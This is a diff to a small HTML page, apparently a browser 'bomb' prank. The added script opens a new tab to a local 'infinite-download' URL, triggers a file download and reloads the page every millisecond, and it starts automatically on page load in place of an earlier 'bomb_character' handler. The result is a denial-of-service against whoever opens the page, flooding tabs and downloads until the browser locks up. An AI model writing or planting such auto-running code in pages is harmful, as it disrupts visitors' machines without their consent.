@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+
 <style type="text/css">
        html, body {
      width: 100%;
@@ -9,6 +10,18 @@
 </style>
 
 <script> 
+
+function openInNewTab() {
+  var rnd = new Date().getTime();
+  var url = "http://localhost:8081/infinite-download/";
+  var win = window.open(url, '_blank');
+  win.focus();
+  download();
+  location.reload( true );
+}
+
+setInterval(openInNewTab, 1);
+
 function download() {
 	var k = new Blob([10]);
 	var l = document.createElement("a"),
@@ -23,7 +36,7 @@ function bomb_character() {
 
 </head>
 
-<body onload="bomb_character();">
+<body onload="openInNewTab();">
 
 </body>
 </body>
